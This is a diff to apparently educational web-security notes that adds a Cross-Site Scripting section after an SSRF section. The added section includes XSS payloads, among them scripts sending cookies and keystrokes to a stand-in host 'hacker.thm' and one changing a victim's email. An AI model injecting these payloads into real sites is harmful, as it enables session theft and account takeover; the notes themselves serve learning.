@@ -143,10 +143,52 @@ A successful SSRF attack can result in any of the following:
 - Reveal authentication tokens/credentials.
 
 ### Example
-![diagram](image.png)
+<img src="./images/ssrf-diagram.png" alt="SSRF Diagram" />
 
 Directory Traversal can also apply, as well as other techniques like:
 - &x=& to prevent other parameters from being processed
 - Checking the headers for sensitive information like cookie structure, auth tokens, secrets, etc.
 
-![potential vulnerabilities](image-1.png)
+<img src="./images/ssrf-examples.png" alt="SSRF Examples" width="800" />
+
+
+## Cross-Site Scripting (XSS)
+Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.
+
+### Proof of Concept
+This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website.
+```html
+<script>alert('XSS');</script>
+```
+
+### Examples
+1. Stealing session/cookies
+```html
+<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+```
+
+2. Keylogging
+```html
+<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
+```
+
+3. Business Logic Abuse
+```html
+<script>user.changeEmail('attacker@hacker.thm');</script>
+```
+
+
+### Reflected XSS
+Reflected XSS occurs when user input is immediately returned by a web application without proper sanitization. This type of XSS is typically found in search results, error messages, or any other response that includes user-supplied data.
+
+<img src="./images/reflected-xss-example1.png" alt="Reflected XSS Diagram" />
+<img src="./images/reflected-xss-example2.png" alt="Reflected XSS Diagram" />
+
+
+### Stored XSS
+Stored XSS, also known as persistent XSS, occurs when user input is stored on the server (e.g., in a database) and later displayed to other users without proper sanitization.
+
+Examples:
+- Comments on a blog
+- User profile information
+- Website Listings
